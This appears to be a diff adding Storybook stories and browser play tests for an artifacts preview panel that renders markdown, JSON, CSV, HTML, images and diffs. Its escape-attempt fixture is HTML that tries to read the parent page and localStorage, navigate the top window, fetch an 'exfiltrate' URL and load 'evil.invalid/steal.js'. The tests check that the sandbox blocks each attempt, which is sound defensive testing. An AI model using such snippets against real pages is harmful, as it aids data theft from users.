@@ -1,0 +1,522 @@
+import { useEffect, useRef, type ReactNode } from "react";
+import type { Meta, StoryObj } from "@storybook/react-vite";
+import { expect, userEvent, waitFor, within } from "@storybook/test";
+import { APIProvider } from "@/browser/contexts/API";
+import { updatePersistedState } from "@/browser/hooks/usePersistedState";
+import { createMockORPCClient } from "@/browser/stories/mocks/orpc";
+import { PIXEL_DISABLED } from "@/browser/stories/meta";
+import { ARTIFACTS_ALLOW_CDN_SCRIPTS_KEY } from "@/common/constants/storage";
+import type {
+  ArtifactEntry,
+  ArtifactListing,
+  ArtifactReadResult,
+} from "@/common/orpc/schemas/artifacts";
+import { getArtifactKind } from "@/common/utils/artifactKind";
+import { ArtifactsPanel } from "./ArtifactsPanel";
+import { writeArtifactSelection } from "./artifactSelection";
+import { DESKTOP_ONLY_PREVIEW_NOTICE } from "./executableFrames";
+
+/**
+ * HTML/SVG frames mount only in the desktop app, detected by its preload bridge
+ * (executableFrames.ts). Storybook has none, so stories stub it, and restore the original on
+ * unmount; `parameters.browserMode` stories remove it to show the fail-closed fallback.
+ */
+function WindowApiStub(props: { browserMode: boolean; children: ReactNode }) {
+  const originalApiRef = useRef(window.api);
+  if (props.browserMode) {
+    delete window.api;
+  } else {
+    window.api = {
+      platform: "linux",
+      versions: {},
+      getIsRosetta: () => Promise.resolve(false),
+    };
+  }
+  useEffect(() => {
+    const savedApi = originalApiRef.current;
+    return () => {
+      window.api = savedApi;
+    };
+  }, []);
+  return <>{props.children}</>;
+}
+
+const meta: Meta<typeof ArtifactsPanel> = {
+  title: "Features/RightSidebar/ArtifactsPanel",
+  component: ArtifactsPanel,
+  decorators: [
+    (Story, context) => (
+      <WindowApiStub browserMode={context.parameters.browserMode === true}>
+        <Story />
+      </WindowApiStub>
+    ),
+  ],
+  parameters: {
+    layout: "fullscreen",
+    viewport: {
+      options: {
+        // Mirror Pixel's named `phone` and `laptop` viewports so the stories' globals pin the
+        // same widths locally that CI snapshots.
+        phone390: {
+          name: "Phone 390",
+          styles: { width: "390px", height: "844px" },
+          type: "mobile",
+        },
+        laptop1200: {
+          name: "Laptop 1200",
+          styles: { width: "1200px", height: "900px" },
+          type: "desktop",
+        },
+      },
+    },
+  },
+};
+
+export default meta;
+type Story = StoryObj<typeof meta>;
+
+const WORKSPACE_ID = "ws-story-artifacts";
+
+// 480x300 bar chart PNG, generated for these stories.
+const CHART_PNG_BASE64 =
+  "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";
+
+const MARKDOWN = [
+  "# Weekly report",
+  "",
+  "Throughput rose **18%** after the queue change. The chart below is a relative image link,",
+  "read from the artifact's folder.",
+  "",
+  "![Throughput by service](img/chart.png)",
+  "",
+  "| Service | p95 (ms) |",
+  "| ------- | -------- |",
+  "| api     | 142      |",
+  "| worker  | 388      |",
+  "",
+  "- Queue depth is stable",
+  "- Retries dropped to `0.4%`",
+].join("\n");
+
+const JSON_TABLE = JSON.stringify(
+  {
+    $xum: "table",
+    columns: ["service", "requests", "p95_ms", "healthy"],
+    rows: [
+      { service: "api", requests: 182340, p95_ms: 142, healthy: true },
+      { service: "worker", requests: 40211, p95_ms: 388, healthy: true },
+      { service: "billing", requests: 9120, p95_ms: 912, healthy: false },
+      { service: "search", requests: 66012, p95_ms: 205, healthy: true },
+    ],
+  },
+  null,
+  2
+);
+
+const CSV = [
+  "region,quarter,revenue,note",
+  'us-east,Q1,1204000,"Includes ""launch"" promo"',
+  "us-west,Q1,980500,",
+  'eu-central,Q1,1100230,"Multi-line',
+  'note"',
+  "ap-south,Q1,402100,Ragged row,extra",
+].join("\r\n");
+
+const HTML = `<!doctype html>
+<html>
+<head>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 0; padding: 16px; background: #0f172a; color: #e2e8f0; }
+  h1 { font-size: 18px; margin: 0 0 12px; }
+  .bars { display: flex; gap: 8px; align-items: flex-end; height: 140px; }
+  .bar { flex: 1; background: linear-gradient(#38bdf8, #6366f1); border-radius: 4px 4px 0 0; }
+  p { font-size: 13px; color: #94a3b8; }
+</style>
+</head>
+<body>
+  <h1>Sandboxed HTML artifact</h1>
+  <div class="bars">
+    <div class="bar" style="height:40%"></div><div class="bar" style="height:75%"></div>
+    <div class="bar" style="height:55%"></div><div class="bar" style="height:90%"></div>
+  </div>
+  <p id="theme"></p>
+  <script>
+    document.getElementById("theme").textContent = "Host theme: " + window.xum.theme;
+  </script>
+</body>
+</html>`;
+
+const DIFF = `diff --git a/src/queue.ts b/src/queue.ts
+index 3b18e51..a9c2f04 100644
+--- a/src/queue.ts
++++ b/src/queue.ts
+@@ -10,6 +10,9 @@ export class Queue {
+   private items: Job[] = [];
+ 
+-  push(job: Job) {
+-    this.items.push(job);
++  push(job: Job): void {
++    if (this.items.length >= this.limit) {
++      throw new Error("queue full");
++    }
++    this.items.push(job);
+   }
+ }
+`;
+
+function ok(
+  path: string,
+  content: string,
+  encoding: "utf8" | "base64" = "utf8"
+): ArtifactReadResult {
+  return {
+    status: "ok",
+    path,
+    kind: getArtifactKind(path),
+    size: content.length,
+    modifiedMs: 1,
+    encoding,
+    content,
+  };
+}
+
+const FILES: Record<string, ArtifactReadResult> = {
+  "report.md": ok("report.md", MARKDOWN),
+  "img/chart.png": ok("img/chart.png", CHART_PNG_BASE64, "base64"),
+  "services.json": ok("services.json", JSON_TABLE),
+  "revenue.csv": ok("revenue.csv", CSV),
+  "dashboard.html": ok("dashboard.html", HTML),
+  "queue.diff": ok("queue.diff", DIFF),
+};
+
+function listingFor(files: Record<string, ArtifactReadResult>): ArtifactListing {
+  const entries: ArtifactEntry[] = Object.values(files).map((file, index) => ({
+    path: file.path,
+    kind: file.kind,
+    size: file.size,
+    modifiedMs: 100 - index,
+  }));
+  return { available: true, dir: "/scratch/artifacts", entries, truncated: false };
+}
+
+function renderPanel(
+  selectedPath: string,
+  files: Record<string, ArtifactReadResult> = FILES,
+  options: { allowCdn?: boolean } = {}
+) {
+  writeArtifactSelection(WORKSPACE_ID, { path: selectedPath });
+  updatePersistedState(ARTIFACTS_ALLOW_CDN_SCRIPTS_KEY, options.allowCdn ?? true);
+  return (
+    <APIProvider
+      client={createMockORPCClient({ artifacts: { listing: listingFor(files), files } })}
+    >
+      {/* Sidebar-like column: fills a phone screen, right-docked at laptop width. */}
+      <div className="bg-background flex h-screen justify-end">
+        <div className="bg-sidebar border-border-light h-full w-full max-w-[440px] border-l">
+          <ArtifactsPanel workspaceId={WORKSPACE_ID} />
+        </div>
+      </div>
+    </APIProvider>
+  );
+}
+
+// Per-renderer stories are for local review and play tests. Pixel captures the two gallery
+// stories below instead (4 snapshots, not 24): the Pixel budget has no headroom.
+const PHONE = {
+  globals: { viewport: { value: "phone390", isRotated: false } },
+  parameters: { pixel: PIXEL_DISABLED },
+} as const;
+const LAPTOP = {
+  globals: { viewport: { value: "laptop1200", isRotated: false } },
+  parameters: { pixel: PIXEL_DISABLED },
+} as const;
+
+const waitForMarkdown = async (canvasElement: HTMLElement) => {
+  const canvas = within(canvasElement);
+  await canvas.findByRole("heading", { name: "Weekly report" });
+  const image = await canvas.findByRole("img", { name: "Throughput by service" });
+  await waitFor(() => expect(image.getAttribute("src")).toMatch(/^data:image\/png;base64,/));
+};
+const waitForJsonTable = async (canvasElement: HTMLElement) => {
+  const canvas = within(canvasElement);
+  await canvas.findByRole("columnheader", { name: "p95_ms" });
+  await canvas.findByRole("cell", { name: "billing" });
+};
+const waitForCsv = async (canvasElement: HTMLElement) => {
+  await within(canvasElement).findByRole("cell", { name: 'Includes "launch" promo' });
+};
+const waitForHtml = async (canvasElement: HTMLElement) => {
+  const frame = await within(canvasElement).findByTestId("artifact-frame");
+  await expect(frame.getAttribute("sandbox")).toBe("allow-scripts");
+};
+const zoomImage = async (canvasElement: HTMLElement) => {
+  const canvas = within(canvasElement);
+  const image = await canvas.findByRole("img", { name: "img/chart.png" });
+  await waitFor(() => expect((image as HTMLImageElement).naturalWidth).toBe(480));
+  await userEvent.click(canvas.getByRole("button", { name: "Actual size (100%)" }));
+  await userEvent.click(canvas.getByRole("button", { name: "Zoom in" }));
+  await canvas.findByText(/125%/);
+};
+const waitForDiff = async (canvasElement: HTMLElement) => {
+  await within(canvasElement).findByText("src/queue.ts");
+};
+
+const RENDERERS = [
+  { path: "report.md", ready: waitForMarkdown },
+  { path: "services.json", ready: waitForJsonTable },
+  { path: "revenue.csv", ready: waitForCsv },
+  { path: "dashboard.html", ready: waitForHtml },
+  { path: "img/chart.png", ready: zoomImage },
+  { path: "queue.diff", ready: waitForDiff },
+] as const;
+
+export const MarkdownPhone: Story = {
+  ...PHONE,
+  render: () => renderPanel("report.md"),
+  play: ({ canvasElement }) => waitForMarkdown(canvasElement),
+};
+export const MarkdownLaptop: Story = {
+  ...LAPTOP,
+  render: () => renderPanel("report.md"),
+  play: ({ canvasElement }) => waitForMarkdown(canvasElement),
+};
+export const JsonTablePhone: Story = {
+  ...PHONE,
+  render: () => renderPanel("services.json"),
+  play: ({ canvasElement }) => waitForJsonTable(canvasElement),
+};
+export const JsonTableLaptop: Story = {
+  ...LAPTOP,
+  render: () => renderPanel("services.json"),
+  play: ({ canvasElement }) => waitForJsonTable(canvasElement),
+};
+export const CsvPhone: Story = {
+  ...PHONE,
+  render: () => renderPanel("revenue.csv"),
+  play: ({ canvasElement }) => waitForCsv(canvasElement),
+};
+export const CsvLaptop: Story = {
+  ...LAPTOP,
+  render: () => renderPanel("revenue.csv"),
+  play: ({ canvasElement }) => waitForCsv(canvasElement),
+};
+export const HtmlSandboxPhone: Story = {
+  ...PHONE,
+  render: () => renderPanel("dashboard.html"),
+  play: ({ canvasElement }) => waitForHtml(canvasElement),
+};
+/** Outside the desktop app the artifact never runs: escaped source and a notice, no frame. */
+export const HtmlBrowserModeFallback: Story = {
+  parameters: { pixel: PIXEL_DISABLED, browserMode: true },
+  render: () => renderPanel("dashboard.html"),
+  play: async ({ canvasElement }) => {
+    const canvas = within(canvasElement);
+    await canvas.findByText(DESKTOP_ONLY_PREVIEW_NOTICE);
+    await canvas.findByText(/<!doctype html>/);
+    await expect(canvas.queryByTestId("artifact-frame")).toBeNull();
+  },
+};
+export const HtmlSandboxLaptop: Story = {
+  ...LAPTOP,
+  render: () => renderPanel("dashboard.html"),
+  play: ({ canvasElement }) => waitForHtml(canvasElement),
+};
+export const ImageZoomPhone: Story = {
+  ...PHONE,
+  render: () => renderPanel("img/chart.png"),
+  play: ({ canvasElement }) => zoomImage(canvasElement),
+};
+export const ImageZoomLaptop: Story = {
+  ...LAPTOP,
+  render: () => renderPanel("img/chart.png"),
+  play: ({ canvasElement }) => zoomImage(canvasElement),
+};
+export const DiffPhone: Story = {
+  ...PHONE,
+  render: () => renderPanel("queue.diff"),
+  play: ({ canvasElement }) => waitForDiff(canvasElement),
+};
+export const DiffLaptop: Story = {
+  ...LAPTOP,
+  render: () => renderPanel("queue.diff"),
+  play: ({ canvasElement }) => waitForDiff(canvasElement),
+};
+
+/** Every renderer at once, one panel per cell: stacked on phones, a 3-column grid on laptops. */
+function renderGallery() {
+  updatePersistedState(ARTIFACTS_ALLOW_CDN_SCRIPTS_KEY, true);
+  for (const renderer of RENDERERS) {
+    writeArtifactSelection(`${WORKSPACE_ID}-${renderer.path}`, { path: renderer.path });
+  }
+  return (
+    <APIProvider
+      client={createMockORPCClient({ artifacts: { listing: listingFor(FILES), files: FILES } })}
+    >
+      <div className="bg-background grid grid-cols-1 gap-2 p-2 min-[1000px]:grid-cols-3">
+        {RENDERERS.map((renderer) => (
+          <div
+            key={renderer.path}
+            data-gallery-cell={renderer.path}
+            className="bg-sidebar border-border-light h-[420px] min-w-0 border"
+          >
+            <ArtifactsPanel workspaceId={`${WORKSPACE_ID}-${renderer.path}`} />
+          </div>
+        ))}
+      </div>
+    </APIProvider>
+  );
+}
+
+async function waitForGallery(canvasElement: HTMLElement) {
+  for (const renderer of RENDERERS) {
+    const cell = canvasElement.querySelector<HTMLElement>(`[data-gallery-cell="${renderer.path}"]`);
+    await expect(cell).not.toBeNull();
+    await renderer.ready(cell!);
+  }
+}
+
+export const GalleryPhone: Story = {
+  globals: { viewport: { value: "phone390", isRotated: false } },
+  parameters: { pixel: { matrix: { themes: ["dark", "light"], viewports: ["phone"] } } },
+  render: renderGallery,
+  play: ({ canvasElement }) => waitForGallery(canvasElement),
+};
+
+export const GalleryLaptop: Story = {
+  globals: { viewport: { value: "laptop1200", isRotated: false } },
+  parameters: { pixel: { matrix: { themes: ["dark", "light"], viewports: ["laptop"] } } },
+  render: renderGallery,
+  play: ({ canvasElement }) => waitForGallery(canvasElement),
+};
+
+// ---------------------------------------------------------------------------------------------
+// Escape attempts (executed in a real browser by the Storybook test runner).
+//
+// The artifact tries to reach the app and reports what happened with a plain postMessage that
+// this story listens for directly (not through the bridge, which would drop it). CSP
+// violations are recorded from inside the frame, so the CDN assertions do not depend on
+// network access: with CDN scripts off, the jsDelivr Chart.js tag must raise a script-src
+// violation; with them on, it must not (it then loads, or fails only on the network).
+// ---------------------------------------------------------------------------------------------
+
+const ESCAPE_HTML = `<!doctype html>
+<html><head>
+<script>
+  var results = { violations: [] };
+  document.addEventListener("securitypolicyviolation", function (e) {
+    results.violations.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI) });
+  });
+  function attempt(fn) { try { fn(); return "allowed"; } catch (e) { return "blocked:" + e.name; } }
+  results.parentDocument = attempt(function () { return parent.document.body.innerHTML.length; });
+  results.localStorage = attempt(function () { return window.localStorage.getItem("x"); });
+  results.topNavigation = attempt(function () { top.location.href = "https://example.com/escaped"; });
+  var fetched = fetch("https://example.com/exfiltrate").then(
+    function () { return "allowed"; },
+    function (e) { return "blocked:" + e.name; }
+  );
+  window.addEventListener("load", function () {
+    fetched.then(function (fetchResult) {
+      setTimeout(function () {
+        results.fetch = fetchResult;
+        results.chartLoaded = typeof window.Chart === "function";
+        parent.postMessage({ xumEscapeTest: results }, "*");
+      }, 300);
+    });
+  });
+</script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
+<script src="https://evil.invalid/steal.js"></script>
+</head><body><p>escape test</p></body></html>`;
+
+interface EscapeResults {
+  violations: Array<{ directive: string; blocked: string }>;
+  parentDocument: string;
+  localStorage: string;
+  topNavigation: string;
+  fetch: string;
+  chartLoaded: boolean;
+}
+
+let escapeResults: EscapeResults | null = null;
+const collectEscapeResults = () => {
+  escapeResults = null;
+  const handler = (event: MessageEvent) => {
+    const data = event.data as { xumEscapeTest?: EscapeResults } | null;
+    if (data?.xumEscapeTest != null) escapeResults = data.xumEscapeTest;
+  };
+  window.addEventListener("message", handler);
+  return () => window.removeEventListener("message", handler);
+};
+
+async function assertEscapeAttemptsFail(allowCdn: boolean) {
+  const startUrl = window.location.href;
+  await waitFor(() => expect(escapeResults).not.toBeNull(), { timeout: 15000 });
+  const results = escapeResults!;
+  await expect(results.parentDocument).toMatch(/^blocked/);
+  await expect(results.localStorage).toMatch(/^blocked/);
+  await expect(results.fetch).toMatch(/^blocked/);
+  // Top navigation is refused (Chromium throws; either way the story page must not move).
+  await expect(results.topNavigation).not.toBe("allowed");
+  await expect(window.location.href).toBe(startUrl);
+  const blockedHost = (host: string) => results.violations.some((v) => v.blocked.includes(host));
+  await expect(blockedHost("evil.invalid")).toBe(true);
+  await expect(blockedHost("example.com")).toBe(true);
+  await expect(blockedHost("cdn.jsdelivr.net")).toBe(!allowCdn);
+  if (!allowCdn) await expect(results.chartLoaded).toBe(false);
+}
+
+export const EscapeAttemptsCdnOn: Story = {
+  parameters: { pixel: PIXEL_DISABLED },
+  beforeEach: collectEscapeResults,
+  render: () => renderPanel("escape.html", { "escape.html": ok("escape.html", ESCAPE_HTML) }),
+  play: () => assertEscapeAttemptsFail(true),
+};
+
+export const EscapeAttemptsCdnOff: Story = {
+  parameters: { pixel: PIXEL_DISABLED },
+  beforeEach: collectEscapeResults,
+  render: () =>
+    renderPanel(
+      "escape.html",
+      { "escape.html": ok("escape.html", ESCAPE_HTML) },
+      { allowCdn: false }
+    ),
+  play: () => assertEscapeAttemptsFail(false),
+};
+
+// The frame forwards Escape over the bridge, so Escape pressed inside a fullscreen HTML
+// artifact exits fullscreen. The artifact synthesizes the key press itself and reports it.
+const BRIDGE_HTML = `<!doctype html><html><head><script>
+  window.addEventListener("load", function () {
+    window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
+    parent.postMessage({ xumBridgeTest: "sent-escape" }, "*");
+  });
+</script></head><body><p>bridge test</p></body></html>`;
+
+let bridgeEscapes = 0;
+export const BridgeEscapeExitsFullscreen: Story = {
+  parameters: { pixel: PIXEL_DISABLED },
+  beforeEach: () => {
+    bridgeEscapes = 0;
+    const handler = (event: MessageEvent) => {
+      if ((event.data as { xumBridgeTest?: string } | null)?.xumBridgeTest === "sent-escape") {
+        bridgeEscapes += 1;
+      }
+    };
+    window.addEventListener("message", handler);
+    return () => window.removeEventListener("message", handler);
+  },
+  render: () => renderPanel("bridge.html", { "bridge.html": ok("bridge.html", BRIDGE_HTML) }),
+  play: async ({ canvasElement }) => {
+    const canvas = within(canvasElement);
+    await canvas.findByTestId("artifact-frame");
+    await waitFor(() => expect(bridgeEscapes).toBeGreaterThanOrEqual(1));
+    const before = bridgeEscapes;
+    await userEvent.click(canvas.getByRole("button", { name: "Fullscreen" }));
+    // The overlay's frame sends Escape on load; the host must leave fullscreen.
+    await waitFor(() => expect(bridgeEscapes).toBeGreaterThan(before), { timeout: 10000 });
+    await waitFor(() =>
+      expect(canvasElement.ownerDocument.querySelector('[role="dialog"]')).toBeNull()
+    );
+  },
+};
